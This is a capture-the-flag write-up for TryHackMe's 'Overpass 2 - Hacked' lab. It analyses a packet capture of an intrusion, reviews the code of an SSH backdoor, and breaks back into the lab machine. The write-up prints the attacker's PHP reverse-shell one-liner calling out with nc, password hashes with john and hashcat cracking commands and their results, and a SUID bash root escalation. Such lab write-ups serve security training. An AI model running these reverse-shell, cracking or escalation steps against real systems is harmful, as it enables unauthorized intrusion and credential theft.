---
title: THM - Overpass 2 - Hacked
tags: [thm, forensic]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/96141387d9d4a22658f8db0ada67d62d.png" alt="Challenge logo" style="height:150px;">
</div>

Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

## Forensics - Analyse the PCAP

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

We have to download the PCAP file from the machine tasks and open it in Wireshark. Right click on the first line and "Follow > TCP Stream".

On the second stream we can see a POST request to `/development/upload.php` in which is passed a file named  `payload.php`. We can see the file content

```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

That's obiously a PHP reverse shell. Looking at the payload we can see which IP address was used by the attacker: `192.168.170.145`.

In the same stream, we can see a sequential GET request to `/development/uploads/`. We can assume that this request executed the payload and gave the attacker the access to the machine.

In the TCP stream number 3 we can see which commands the attacker typed. The attacker gained access as `www-data` user and stabilized his shell with python3. He then proceeded to read the content of `.overpass` file and escalated his privileges as `james` using `whenevernoteartinstant` as password.

After a little bit of thinkering, the attacker proceeded to clone this Github repo within james' home directory: `https://github.com/NinjaJc01/ssh-backdoor`. He then generated an RSA key pair and executed the backdoor. This gave the attacker persistence inside the comromised machine.

We can see that the attacker, before executing the backdoor, looked at the content of `/etc/passwd` file in which are stored all users hashed passwords. We can try to crack them with John The Ripper. Copy and paste the following lines inside a text file.

```
$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/
$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/
$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0
$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.
```

The machine's tasks tells us to use fasttrack wordlist to crack the the passwords.

```
$ john --wordlist=./fasttrack.txt hashes

1qaz2wsx         (?)     
abcd123          (?)     
secret12         (?)
secuirty3        (?)     
```

JTR was able to crack 4 hashes.

## Reseearch - Analyse the code

We have to do some simple code analysis on the backdoor. Let's clone the repo on our machine.

```
$ git clone https://github.com/NinjaJc01/ssh-backdoor
```

Now we have to view the backdoor source code inside the `main.go` file. The backdoor default hash is declared at line 19

```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

Scrolling through the code we can see this function declaration

```go
func verifyPass(hash, salt, password string) bool {
        resultHash := hashPassword(password, salt)
        return resultHash == hash
}
```

The `hash` is passed as an argument toghether with the `salt` to the `hashPassword` function. This function puts them togheter to create the final hash. At line 108 we can see which default `salt` is used.

```go
func passwordHandler(_ ssh.Context, password string) bool {
        return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

To see which hash did the attacker use, we have to return back on the PCAP file. At the end of the third stream, we can see it

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

Inside the `main.go` file, we are able to see the usage of `SHA-512`. We can try to crack the hash with hashcat. Just search for the SHA-512 password + salt option (1710) and put the values toghether inside a text file

```
$ hashcat -m 1710 hash /usr/share/wordlists/rockyou.txt

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

The cracked passwrd is `november16`.

## Attack - Get back in!

We have to hack back into the machine. Let's try to log in with `james` user since we found his password in the step before.

```
$ ssh -p 2222 james@10.10.68.50 -oHostKeyAlgorithms=+ssh-rsa
```

We are in. Let's navigate to james' home and get the first flag.

```
thm{d119b4fa8c497ddb0525f7ad[redacted]}
```

We need to elevate our privileges to become an administrator. I started the enumeration finding all SUIDs binary in the machine.

```
$ find / -perm -u=s 2>/dev/null

/home/james/.suid_bash
```

That one stands out. After a little bit of investigations I found that is an ELF which spawn a bash shell as `james`. Let's go to GTFObins and look if we can escalate our privileges with it.

I was able to find that we can simply type `./bash -p` and become root.

```
$ ./.suid_bash -p

.suid_bash-4.4# whoami
root
```

Let's get the flag

```
thm{d53b2684f169360bb9606c33[redacted]}
```